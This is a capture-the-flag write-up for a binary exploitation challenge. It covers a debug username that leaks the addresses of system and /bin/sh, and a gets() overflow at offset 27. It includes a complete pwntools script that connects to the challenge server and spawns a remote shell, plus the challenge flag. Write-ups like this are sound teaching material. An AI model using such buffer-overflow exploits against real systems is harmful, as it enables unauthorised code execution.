# Buffer-Overflow with a twist

**This challenge required you to find a correct username that would leak two addresses on the stack, performing a buffer-overflow and calling the leaked addresses.**

### Analyzing the binary

after running `readelf -s zero_cool | grep FUNC` we see two interesting functions
`username` and `password` 

Opening the binary in ghidra and looking at the disassembly from the function `username` we quickly get to a section that looks peculiar

![Username Disassembly](https://github.com/ZeroCooL-555/CTF/blob/master/10an/pwn/zerocool/username.png)

As we can see if we pass in the username `debug` we get where in memory the address of `system` is and where the address of `/bin/sh` is.

Now the program wants us to pass a password. Disassembling the function `password` we very quickly see that our input is passed to a
very dangerous function called `gets()` 


![Password Disassembly](https://github.com/ZeroCooL-555/CTF/blob/master/10an/pwn/zerocool/password.png)


explanation from the man page 

**Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely danger‐ous to use.**

Let's abuse `gets()`. After some trial and error the sweet spot is found to be `offset 27`. With all this information we are ready to move on to the attack phase.


### The Attack

Starting out we send the program a username in this case `debug` after that we grab the two leaked addresses. Now we are prompted for a password, we pass in our 27 A's and then call the first leaked address.
After having called the first address we add `4 bytes` worth of padding to be able to set the parameter for the first function. If done correctly we should have a call to `system` with the parameter `/bin/sh`.

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'i386'

elf = ELF('./zero_cool')
r = remote('0xa.is', 31338)

r.recvuntil('Username: ')
r.sendline('debug')

offset = 27

shell_func = r.recvline().decode('utf-8').split(': ')[1]
shell_func_param = r.recvline().decode('utf-8').split(': ')[1]

shell_func_addr = int(shell_func, 16)
shell_func_param_addr = int(shell_func_param, 16)

payload = [
        b"A"*offset,
        p32(shell_func_addr),
        b"A"*4,
        p32(shell_func_param_addr)
]

payload = b"".join(payload)
r.sendline(payload)
r.interactive()
```

### Flag: 10an{run_4nt1_v1ru5_g1v3_m3_5y5t3m5_d15pl4y_n0w}

